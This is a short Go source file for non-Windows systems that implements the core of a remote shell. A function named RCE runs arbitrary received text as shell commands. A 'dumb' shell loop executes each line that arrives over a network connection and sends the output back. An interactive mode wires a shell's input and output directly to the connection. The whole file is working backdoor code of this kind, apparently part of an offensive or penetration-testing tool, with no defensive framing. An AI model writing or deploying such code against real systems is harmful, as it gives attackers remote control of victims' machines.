// +build !windows

package main

import (
	"bufio"
	"net"
	"os/exec"
)

func RCE(shell string, buf []byte) []byte {
	cmd := exec.Command(shell, "-c", string(buf))
	output, _ := cmd.CombinedOutput()

	return output
}

func DumbShell(shell string, conn net.Conn) {
	reader := bufio.NewReader(conn)
	for {
		conn.Write([]byte("> "))
		stdin, err := reader.ReadBytes('\n')
		if err != nil {
			conn.Close()
			break
		}

		output := RCE(shell, stdin)
		conn.Write(output)
	}
}

func InteractiveShell(shell string, conn net.Conn) {
	cmd := exec.Command(shell, "-c", shell+" -i")
	cmd.Stdin, cmd.Stdout, cmd.Stderr = conn, conn, conn
	cmd.Run()
	conn.Close()
}
